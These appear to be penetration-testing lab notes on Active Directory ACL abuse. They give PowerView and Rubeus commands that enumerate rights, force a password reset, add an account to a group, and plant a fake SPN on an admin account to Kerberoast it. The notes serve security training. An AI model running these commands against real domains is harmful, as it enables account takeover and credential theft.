# ACL Enumeration
Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

![alt text](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)

ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite abused with Set-DomainObject
WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember


## Enumerating ACLs with PowerView
**Using Find-InterestingDomainAcl**
```
PS > Find-InterestingDomainAcl
```

We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.

Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.

**Using Get-DomainObjectACL**
```
PS > Import-Module .\PowerView.ps1
PS > $sid = Convert-NameToSid <USERNAME>
PS > Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**Performing a Reverse Search & Mapping to a GUID Value**
```
PS > $guid= "<ObjectAceType>"
PS > Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

**Using the -ResolveGUIDs Flag**
```
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

**Creating a List of Domain Users**
```
PS > Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

**A Useful foreach Loop**
```
PS > foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

**Further Enumeration of Rights Using damundsen**
```
PS > $sid2 = Convert-NameToSid damundsen
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

**Investigating the Help Desk Level 1 Group with Get-DomainGroup**
```
PS > Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

**Investigating the Information Technology Group**
```
PS > $itgroupsid = Convert-NameToSid "Information Technology"
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

**Looking for Interesting Access**
```
PS > $adunnsid = Convert-NameToSid adunn 
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

## Enumerating ACLs with BloodHound
Next, we can set the <Username> user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights




# ACL Abuse Tactics
## Abusing ACLs
### ForceChangePassword
So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.

**Creating a PSCredential Object**
```
PS > $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS > $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

**Creating a SecureString Object**
```
PS > $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

**Changing the User's Password**
```
PS > Import-Module .\PowerView.ps1
PS > Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the wley user that we control. Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.

### Add-DomainGroupMember
**Creating a SecureString Object using damundsen**
```
PS > $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS > $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

Next, we can use the Add-DomainGroupMember function to add ourselves to the target group

**Adding damundsen to the Help Desk Level 1 Group**
```
PS > Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

PS > Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

**Confirming damundsen was Added to the Group**
```
PS > Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast [https://github.com/ShutdownRepo/targetedKerberoast] to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

### Creating a Fake SPN
```
PS > Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```
$ targetedKerberoast.py -d <domain> -u <user> -p <pass>
```

**Kerberoasting with Rubeus**
```
PS > .\Rubeus.exe kerberoast /user:adunn /nowrap
```

#### Cleanup
**Removing the Fake SPN from adunn's Account**
```
PS > Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

**Removing damundsen from the Help Desk Level 1 Group**
```
PS > Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

**Confirming damundsen was Removed from the Group**
```
PS > Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```